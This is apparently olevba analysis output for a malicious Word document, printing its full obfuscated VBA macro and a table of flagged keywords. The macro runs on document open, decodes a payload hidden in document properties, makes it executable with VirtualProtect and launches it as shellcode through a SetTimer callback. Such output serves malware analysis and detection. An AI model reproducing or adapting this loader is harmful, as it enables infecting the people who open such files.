olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Shelod.gen-f3884b52646133dd3cf996ffb5f45f83f11c5b4c49ca90f11143cba25f1eda9c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan.MSOffice.Shelod.gen-f3884b52646133dd3cf996ffb5f45f83f11c5b4c49ca90f11143cba25f1eda9c - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#If VBA7 Then
Private Declare PtrSafe Function UnlivablenessButtoning Lib "user32" Alias "SetTimer" (ByVal TempersUnrazored As LongPtr, ByVal EmanativelyPeriorbit As LongPtr, ByVal NitroglycerineBullesceneApophysitis As LongPtr, ByVal PresumesWrithyAlgologically As LongPtr) As LongPtr
Private Declare PtrSafe Function SpelunkDeprotestantize Lib "user32" Alias "KillTimer" (ByVal BaccillaHereticizeTrilobe As LongPtr, ByVal CarterImmolated As LongPtr) As LongPtr
Private Declare PtrSafe Function SignificativelyVadimonium Lib "kernel32" Alias "VirtualProtect" (ByVal BemixesArgyranthemousUnderglow As LongPtr, ByVal UnsadnessInsectivalHeterandry As LongPtr, ByVal WaterspoutBrierrootBarefooted As LongPtr, LickedElixirsDeathlessly As LongPtr) As LongPtr
#Else
Private Declare Function UnlivablenessButtoning Lib "user32" Alias "SetTimer" ( ByVal HallopididaeCroiseeAmorphously As Long, ByVal RacemocarbonateRedemptressYouthens As Long, ByVal InfortitudeFluttery As Long, ByVal VentricularisDesterilizationSpoorn As Any) As Long
Private Declare Function SpelunkDeprotestantize Lib "user32" Alias "KillTimer" ( ByVal GymnastsAmelification As Long, ByVal ImpiteousSweptback As Long) As Long
Private Declare Function SignificativelyVadimonium Lib "kernel32" Alias "VirtualProtect"  (ByVal WadmelsUnpalsied As Long, ByVal JosephsNonexpedientialSerphidae As Long, ByVal OverregularityVespiariesEpigynum As Long, BantamweightSokotriPlatterful As Long) As Long
#End If
Private Sub Document_Open()
Dim EducatedTheopneustyWassailing() As Byte
#If Win64 Then
EducatedTheopneustyWassailing = HypnocystWestwardsPhallus(ActiveDocument.BuiltInDocumentProperties(XvKolFHuc("tP6bLv4E8")).Value)
#Else
EducatedTheopneustyWassailing = HypnocystWestwardsPhallus(ActiveDocument.BuiltInDocumentProperties(XvKolFHuc("rAzMRFT_L")).Value)
#End If
#If VBA7 Then
Dim WatchersTristichArchaisms As LongPtr
Dim VaaliteNonrevocable As LongPtr
Dim shellCode As LongPtr
Dim ReservativeReelection As LongPtr
#Else
Dim WatchersTristichArchaisms As Long
Dim VaaliteNonrevocable As Long
Dim shellCode As Long
Dim ReservativeReelection As Long
#End If
VaaliteNonrevocable = UBound(EducatedTheopneustyWassailing) + 1
shellCode = VarPtr(EducatedTheopneustyWassailing(0))
SignificativelyVadimonium shellCode, VaaliteNonrevocable, 64, VarPtr(WatchersTristichArchaisms)
GetObject(XvKolFHuc("uaVqwwYo")).Environment(XvKolFHuc("HITX64tAZ"))(XvKolFHuc("JJOR4P6")) = ActiveDocument.FullName
GetObject(XvKolFHuc("hANAkUtpD")).Environment(XvKolFHuc("ZM13OU"))(XvKolFHuc("PE6gDcPH")) = XvKolFHuc("gXzwOZu3")
ReservativeReelection = UnlivablenessButtoning(0, shellCode, 1, shellCode)
UnseparateNonrateableMadcaps 1
SpelunkDeprotestantize 0, ReservativeReelection
GetObject(XvKolFHuc("oafIJJ")).Environment(XvKolFHuc("WRgtx4Wnl")).Remove (XvKolFHuc("qQchZ62P8q8qB"))
GetObject(XvKolFHuc("ICfM7NcCJ6m")).Environment(XvKolFHuc("tQTP3bmaL")).Remove (XvKolFHuc("AgkRNYpaM0Z"))
ReDim EducatedTheopneustyWassailing(1)
End Sub
Public Function XvKolFHuc(strInput)
XvKolFHuc = StrReverse(ActiveDocument.CustomDocumentProperties(strInput))
End Function
Sub UnseparateNonrateableMadcaps(Finish)
Dim TankshipDustbox As Long
Dim CholeraUndisqualified As Long
CholeraUndisqualified = Timer() + (Finish)
Do
TankshipDustbox = Timer()
DoEvents
Loop Until TankshipDustbox > CholeraUndisqualified
End Sub
Function NeoterismPucklikeGularis(TrinkumsSynopses, RuralizedBananalander)
NeoterismPucklikeGularis = Mid(TrinkumsSynopses, RuralizedBananalander + 1, 1)
End Function
Function UntumidlyStrained(EmpurplesColleensUnclotted) As Long
If Int(Rnd(23)) > 2 Then
UntumidlyStrained = 9000
Else
UntumidlyStrained = Len(EmpurplesColleensUnclotted)
End If
End Function
Function HypnocystWestwardsPhallus(CurfewedBarmclothBoldo)
ReDim RefluousAstrodynamicsElectromobilism(UntumidlyStrained(CurfewedBarmclothBoldo) - 1) As Byte
Dim AspergillumEschalotsNoncompetent As Long, StarlightHygrophaneity As Long
Dim NoncitableUnbuiltGibboseness: NoncitableUnbuiltGibboseness = XvKolFHuc("LSQgRkfoNo43") & XvKolFHuc("H5F9jKUCjb")
For AspergillumEschalotsNoncompetent = 0 To UntumidlyStrained(CurfewedBarmclothBoldo) - 1 Step 2
StarlightHygrophaneity = AspergillumEschalotsNoncompetent / 2
RefluousAstrodynamicsElectromobilism(StarlightHygrophaneity) = CDec(NoncitableUnbuiltGibboseness & NeoterismPucklikeGularis(CurfewedBarmclothBoldo, AspergillumEschalotsNoncompetent) & NeoterismPucklikeGularis(CurfewedBarmclothBoldo, AspergillumEschalotsNoncompetent + 1))
Next
HypnocystWestwardsPhallus = RefluousAstrodynamicsElectromobilism
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environment         |May read system environment variables        |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VirtualProtect      |May inject code into another process         |
|Suspicious|SetTimer            |May run a shellcode in memory                |
|Suspicious|StrReverse          |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

